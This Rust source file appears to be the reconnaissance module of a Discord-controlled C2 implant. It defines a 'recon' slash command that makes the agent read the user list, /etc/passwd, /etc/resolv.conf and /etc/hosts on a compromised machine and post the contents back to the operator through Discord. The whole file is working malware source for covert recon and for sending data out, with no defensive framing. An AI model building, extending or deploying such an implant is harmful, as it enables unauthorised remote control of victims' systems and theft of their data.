use serenity::{
	builder::{CreateApplicationCommand, CreateApplicationCommandOption},
	client::Context,
	model::application::{
		command::CommandOptionType,
		interaction::application_command::{
			ApplicationCommandInteraction,
			CommandDataOption,
			CommandDataOptionValue,
		},
	},
};
use tracing::error;

use crate::{
	discord_utils::bot_functions::send_interaction_response,
	errors::DiscordC2Error,
	os::recon_utils::{run_recon, ReconType},
};

pub fn create_recon_option(
	option: &mut CreateApplicationCommandOption,
) -> &mut CreateApplicationCommandOption {
	let option = option
		.name("recon_type")
		.kind(CommandOptionType::String)
		.description("Type of recon command to perform")
        .required(true);

    // Potentially expand this to a sub command in the future?
	option.add_string_choice("Get user list", "userlist");

	#[cfg(target_os = "linux")]
	option
		.add_string_choice("Get /etc/passwd", "/etc/passwd")
		.add_string_choice("Get /etc/resolv.conf", "/etc/resolv.conf")
		.add_string_choice("Get /etc/hosts", "/etc/hosts");

	//#[cfg(target_os = "windows")]
	// nothing here yet

	option
}

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
	command
		.name("recon")
		.description("Performs various recon operations/commands with the agent.")
		.create_option(|option| {
			create_recon_option(option) // Call the recon function from here, passing in the mutable reference to our option.
		});
	command
}

pub async fn run(options: &[CommandDataOption]) -> Result<String, DiscordC2Error> {
	let options = options.to_owned();

	let operation = options
		.get(0)
		.ok_or(DiscordC2Error::InternalError(
			"Expected recon operation at index 0".to_string(),
		))?
		.resolved
		.as_ref()
		.ok_or(DiscordC2Error::InternalError(
			"Expected valid recon operation".to_string(),
		))?;

	if let CommandDataOptionValue::String(operation) = operation {
		match operation.as_str() {
			"userlist" => Ok(run_recon("userlist", ReconType::Agnostic)),
			#[cfg(target_os = "windows")]
			_ => Ok(run_recon(operation.as_str(), ReconType::Windows)),
			#[cfg(target_os = "linux")]
			_ => Ok(run_recon(operation.as_str(), ReconType::Linux)),
		}
	} else {
		Err(DiscordC2Error::InvalidInput(
			"Invalid recon operation.".to_string(),
		))
	}
}

pub async fn recon_handler(
	ctx: &Context,
	command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
	let operation = run(&command.data.options).await;

    // TODO: This is where we would handle the 2k character limit, probably by fixing send_interaction_response ?? 
	match operation {
		Ok(string) => {

            let formatted = format!("```ansi\n{}```", string);
            			// Send the succesful response with the output of operation
			if let Err(why) = send_interaction_response(ctx, command, formatted, None).await {
				error!(
					"Ran into an error when sending an interaction response: {}",
					why
				);
			}
		},
		Err(why) => {
			// Send a response indicating why this failed.
			if let Err(why) = send_interaction_response(ctx, command, why.to_string(), None).await {
				error!(
					"Ran into an error when sending an interaction response: {}",
					why
				);
			}
		},
	}

	Ok(())
}
